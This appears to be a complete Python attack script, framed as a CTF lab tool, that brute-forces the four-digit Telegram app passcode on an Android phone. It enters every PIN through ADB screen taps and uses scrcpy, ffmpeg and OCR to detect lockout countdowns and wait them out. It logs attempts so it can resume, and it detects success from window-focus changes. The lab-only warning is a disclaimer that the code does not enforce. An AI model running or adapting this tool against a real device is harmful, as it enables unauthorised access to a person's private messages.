"""
MIT License

Copyright (c) 2025 https://wlb.do/links/

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

'''
Telegram 4-Digits PIN Brute-Force Tool
code by @B0dre

A script to brute-force a 4-digit PIN on a Telegram app in a controlled CTF lab environment.
It uses ADB to interact with the device, scrcpy and ffmpeg to capture the screen,
and pytesseract for OCR to detect countdowns or failures.

> [!WARNING]
> **DO NOT USE THIS TOOL OUTSIDE A CONTROLLED CTF OR LABORATORY ENVIRONMENT!**
>
> This script is designed for educational purposes only within a home Capture The Flag (CTF) lab. Using it on real Telegram accounts, unauthorized devices, or outside a controlled environment is **illegal, unethical, and a violation of Telegram's Terms of Service**. Doing so may result in account bans, legal consequences, or other serious repercussions.
>
> **Tip: Be cautious!**
>
> Think before you act. Respect privacy, laws, and the rights of others. Misuse of this tool is your responsibility, and the author is not liable for any damage or legal issues caused by improper use. Use it wisely and only in an authorized, safe context.
> **By using this script, you agree to these terms.**   
'''

import time
import os
import subprocess
import re
from ppadb.client import Client
import sys
import pytesseract
from PIL import Image
from dotenv import load_dotenv

# ANSI color codes
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

# Banner
print(f"{YELLOW}========================================{RESET}")
print(f"{YELLOW}        4-PIN BRUTEFORCE TELEGRAM       {RESET}")
print(f"{YELLOW}                by @B0dre               {RESET}")
print(f"{YELLOW}========================================{RESET}")

# Load environment variables from .env
load_dotenv()
DEVICE_SERIAL = os.getenv("DEVICE_SERIAL", "QWERTY0123456789")  # Default if not in .env (change as needed command "adb devices" to verify
print(f"{YELLOW}[*] ⏳ Using device serial: {DEVICE_SERIAL}{RESET}")

# Attempt to load configuration from config.py, fall back to defaults if missing
try:
    from config import DELAY, ADB_HOST, ADB_PORT, LOG_FILE, PIN_FIELD_X, PIN_FIELD_Y, KEYPAD_COORDS, APP_PACKAGE, TESSERACT_PATH, SCRCPY_PATH, FFMPEG_PATH
except ImportError:
    print(f"{YELLOW}[*] ⏳ Config file not found, using default values.{RESET}")
    DELAY = 23  # Default delay if no countdown detected
    ADB_HOST = "127.0.0.1"
    ADB_PORT = 5037
    LOG_FILE = "pin_attempts.log"  # Log file for attempted PINs
    PIN_FIELD_X = 450  # Near "Enter your PIN" (adjust if needed)
    PIN_FIELD_Y = 320  # Adjust if needed
    KEYPAD_COORDS = {
        '1': (210, 1300), '2': (460, 1300), '3': (890, 1300),
        '4': (300, 1400), '5': (500, 1400), '6': (800, 1400),
        '7': (300, 1700), '8': (460, 1700), '9': (800, 1700),
        '0': (460, 1930)
    }
    APP_PACKAGE = "org.telegram.messenger"  # Telegram package (adjust if modified)
    TESSERACT_PATH = "/usr/local/bin/tesseract"  # Path to tesseract (adjust for your system)
    SCRCPY_PATH = "scrcpy"  # Path to scrcpy executable
    FFMPEG_PATH = "ffmpeg"  # Path to ffmpeg executable

def check_device():
    """Check if the Android device is connected and authorized."""
    while True:
        try:
            adb = Client(host=ADB_HOST, port=ADB_PORT)
            devices = adb.devices()
            if not devices:
                print(f"{RED}[!] 🚫 No devices found. Please connect your Android device via USB and enable USB Debugging:{RESET}")
                print(f"{YELLOW}   1. Go to Settings > About Phone > Tap 'Build Number' 7 times to enable Developer Options.{RESET}")
                print(f"{YELLOW}   2. Go to Settings > System > Developer Options > Enable 'USB Debugging'.{RESET}")
                print(f"{YELLOW}   3. Go to Settings > System > Developer Options > Enable 'Keep screen on while charging'.{RESET}")
                print(f"{YELLOW}   4. Connect your device with a USB cable and allow debugging on the prompt.{RESET}")
                print(f"{YELLOW}   5. Select 'Charge only'.{RESET}")
                input(f"{YELLOW}Press Enter to verify connection again...{RESET}")
                continue
            for device in devices:
                if device.serial == DEVICE_SERIAL:
                    print(f"{GREEN}[+] ✅ Device connected: {device.serial}{RESET}")
                    return device
            print(f"{RED}[!] 🚫 Device {DEVICE_SERIAL} not found. Available devices: {[d.serial for d in devices]}{RESET}")
            input(f"{YELLOW}Press Enter to verify connection again...{RESET}")
        except Exception as e:
            print(f"{RED}[!] 🚫 Error connecting to ADB: {e}{RESET}")
            input(f"{YELLOW}Press Enter to verify connection again...{RESET}")

def get_current_focus(device):
    """Get the current app activity via dumpsys."""
    try:
        output = device.shell("dumpsys window | grep mCurrentFocus || true")
        return output.strip()
    except Exception as e:
        print(f"{RED}[!] 🚫 Error getting current focus: {e}{RESET}")
        return ""

def record_screen(output_file="temp.mp4"):
    """Record a 1-second video using scrcpy and extract the first frame."""
    # Clean up existing temp files to avoid conflicts
    for temp_file in ["temp.png", "temp.mp4"]:
        if os.path.exists(temp_file):
            os.remove(temp_file)
            print(f"{YELLOW}[*] ⏳ Removed existing {temp_file}{RESET}")
    
    try:
        # Record 1-second video with timeout
        result = subprocess.run([SCRCPY_PATH, "--record", output_file, "--max-size", "1280", "--time-limit", "1"], 
                              check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                              timeout=5)
        print(f"{YELLOW}[*] ⏳ Video recorded as {output_file}{RESET}")
        
        # Check if video file exists and has content
        if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
            print(f"{RED}[!] 🚫 No valid video recorded.{RESET}")
            return None
        
        # Extract first frame
        frame_file = output_file.replace(".mp4", ".png")
        subprocess.run([FFMPEG_PATH, "-i", output_file, "-vf", "select='eq(n,0)'", "-vframes", "1", frame_file], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{YELLOW}[*] ⏳ First frame extracted as {frame_file}{RESET}")
        
        return frame_file
    except subprocess.TimeoutExpired as e:
        print(f"{RED}[!] 🚫 Recording timed out: {e}{RESET}")
        if os.path.exists(output_file):
            os.remove(output_file)
        return None
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] 🚫 Error in recording or frame extraction: {e}{RESET}")
        if os.path.exists(output_file):
            os.remove(output_file)
        return None
    finally:
        # Clean up video file
        if os.path.exists(output_file):
            os.remove(output_file)

def ocr_countdown(image_path):
    """Use OCR to detect countdown or failure text and extract duration."""
    try:
        image = Image.open(image_path)
        # Optional: Crop to focus on countdown area (adjust coordinates if needed)
        # image = image.crop((400, 200, 600, 400))  # Example, tweak as needed
        text = pytesseract.image_to_string(image).lower()
        print(f"{YELLOW}[*] ⏳ OCR detected: {text}{RESET}")
        
        # Check for "unlock to use telegram" or keypad layout to skip countdown
        if "unlock to use telegram" in text or any(k in text for k in ["abc def", "ghi jkl", "pqrs tuv"]):
            print(f"{YELLOW}[*] ⏳ Unlock screen detected, skipping countdown.{RESET}")
            return 0  # Return 0 to skip delay
        
        # Extract countdown duration (e.g., "12 seconds" from "try again in 12 seconds")
        duration_match = re.search(r"in (\d+) seconds", text)
        if duration_match:
            duration = int(duration_match.group(1))
            print(f"{YELLOW}[*] ⏳ Countdown detected: {duration} seconds.{RESET}")
            return duration
        
        # Default countdown keywords if no specific duration
        countdown_keywords = ["countdown", "30s", "try again", "waiting 30 seconds", "failed", "incorrect"]
        if any(keyword in text for keyword in countdown_keywords):
            print(f"{YELLOW}[*] ⏳ Generic countdown detected, using default delay.{RESET}")
            return DELAY
        
        return None  # No countdown confirmed
    except Exception as e:
        print(f"{RED}[!] 🚫 Error in OCR: {e}{RESET}")
        return None

def get_last_pin():
    """Read the last attempted PIN from the log file."""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            for line in reversed(lines):
                if "Tried PIN:" in line:
                    try:
                        pin_str = line.split("Tried PIN: ")[1].split(" at ")[0]
                        if "(INTERRUPTED)" in line:
                            return int(pin_str) - 1 # Return exact PIN if interrupted
                        return int(pin_str) + 1  # Increment if not interrupted
                    except (IndexError, ValueError):
                        continue
    return -1  # Start from 0000 if no valid PIN found

def send_pin(device, pin, initial_focus_hex):
    try:
        # Focus PIN field
        device.shell(f"input tap {PIN_FIELD_X} {PIN_FIELD_Y}")
        time.sleep(0.2)
        
        # Clear input field
        for _ in range(4):
            device.shell("input keyevent 67")  # KEYCODE_DEL
            time.sleep(0.1)
        
        # Enter PIN by tapping each digit
        pin_str = f"{pin:04d}"
        for digit in pin_str:
            x, y = KEYPAD_COORDS[digit]
            device.shell(f"input tap {x} {y}")
            time.sleep(0.3)  # Delay for keypad response
        
        print(f"{YELLOW}[*] ⏳ Trying PIN: {pin_str}{RESET}")
        
        # Log attempt
        with open(LOG_FILE, "a") as f:
            f.write(f"Tried PIN: {pin_str} at {time.ctime()}\n")
        
        # Wait for auto-submission and response
        time.sleep(2)  # Give app time to process
        
        # Record screen and check for countdown or keypad
        screenshot = record_screen()
        if screenshot:
            delay = ocr_countdown(screenshot)
            if delay is not None:  # Countdown or keypad detected
                print(f"{YELLOW}[-] ⏳ PIN {pin_str} failed, countdown or keypad detected{RESET}")
                time.sleep(delay if delay else DELAY)
                if os.path.exists(screenshot):
                    os.remove(screenshot)
                return False
        
        # Check if app is Telegram and hex has changed
        current_focus = get_current_focus(device)
        if APP_PACKAGE not in current_focus:
            print(f"{RED}[-] 🚫 PIN {pin_str} failed, not Telegram app{RESET}")
            if os.path.exists(screenshot):
                os.remove(screenshot)
            return False
        current_focus_hex = current_focus.split(" ")[0] if current_focus else ""
        if current_focus_hex == initial_focus_hex:
            print(f"{YELLOW}[-] ⏳ PIN {pin_str} failed, hex unchanged{RESET}")
            if os.path.exists(screenshot):
                os.remove(screenshot)
            return False
        
        # Success confirmed: hex changed, Telegram, no countdown/keypad
        print(f"{GREEN}[+] ✅ Possible Success! PIN: {pin_str} (app opened, verify flag){RESET}")
        proof_video = f"success_pin_{pin_str}.mp4"
        proof_frame = record_screen(proof_video)
        if proof_frame:
            print(f"{GREEN}[+] ✅ Proof saved: {proof_video} and {proof_frame}{RESET}")
        else:
            print(f"{YELLOW}[*] ⏳ Failed to save proof, verify manually.{RESET}")
        if os.path.exists(screenshot):
            os.remove(screenshot)
        with open(LOG_FILE, "a") as f:
            f.write(f"Tried PIN: {pin_str} at {time.ctime()} (SUCCESS)\n")
        return True
        
    except Exception as e:
        print(f"{RED}[!] 🚫 Error sending PIN {pin_str}: {e}{RESET}")
        with open(LOG_FILE, "a") as f:
            f.write(f"Tried PIN: {pin_str} at {time.ctime()} (ERROR)\n")
        if os.path.exists(screenshot):
            os.remove(screenshot)
        return False

def main():
    print(f"{YELLOW}[*] ⏳ Starting PIN bruteforce for CTF lab...{RESET}")
    
    # Initialize ADB and check device
    device = check_device()
    
    # Clear logcat
    device.shell("logcat -c")
    
    # Get initial app focus (PIN screen)
    initial_focus = get_current_focus(device)
    print(f"{YELLOW}[*] ⏳ Initial app focus: {initial_focus}{RESET}")
    initial_focus_hex = None
    if not initial_focus or "org.telegram.messenger.AquaIcon" not in initial_focus:
        print(f"{RED}[!] 🚫 The app focus is not on the Telegram PIN screen. Please open the Telegram app manually and leave it on the PIN entry screen.{RESET}")
        input(f"{YELLOW}Press Enter to verify app focus again...{RESET}")
        initial_focus = get_current_focus(device)
        if not initial_focus or "org.telegram.messenger.AquaIcon" not in initial_focus:
            print(f"{RED}[!] 🚫 Telegram app is still not focused. Please ensure it is open on the PIN screen.{RESET}")
            sys.exit(1)
        print(f"{GREEN}[+] ✅ App focus verified: {initial_focus}{RESET}")
        initial_focus_hex = initial_focus.split(" ")[0] if initial_focus else ""
    else:
        initial_focus_hex = initial_focus.split(" ")[0] if initial_focus else ""
    
    # Determine starting PIN
    start_pin = get_last_pin() + 1
    if start_pin < 0 or start_pin > 9999:
        start_pin = 0
    print(f"{YELLOW}[*] ⏳ Starting from PIN: {start_pin:04d}{RESET}")
    
    # Bruteforce loop (from start_pin to 9999)
    for pin in range(start_pin, 10000):
        try:
            success = send_pin(device, pin, initial_focus_hex)
            if success:
                print(f"{GREEN}[+] ✅ CTF Challenge Solved! PIN: {pin:04d} (verify proof){RESET}")
                sys.exit(0)  # Exit script on success
            # Periodic device check
            if pin % 10 == 0:
                device = check_device()
                device.shell("logcat -c")  # Clear logs
        except KeyboardInterrupt:
            print(f"\n{RED}[!] 🚫 Script interrupted. Last PIN tried: {pin:04d}. Will resume from {pin:04d} next time.{RESET}")
            with open(LOG_FILE, "a") as f:
                f.write(f"Tried PIN: {pin:04d} at {time.ctime()} (INTERRUPTED)\n")
            sys.exit(0)
        except Exception as e:
            print(f"\n{RED}[!] 🚫 Unexpected error: {e}. Last PIN tried: {pin:04d}. Will resume from {pin:04d} next time.{RESET}")
            with open(LOG_FILE, "a") as f:
                f.write(f"Tried PIN: {pin:04d} at {time.ctime()} (ERROR)\n")
            sys.exit(1)
    else:
        print(f"{RED}[-] 🚫 Exhausted all PINs (0000–9999). No success.{RESET}")

if __name__ == "__main__":
    main()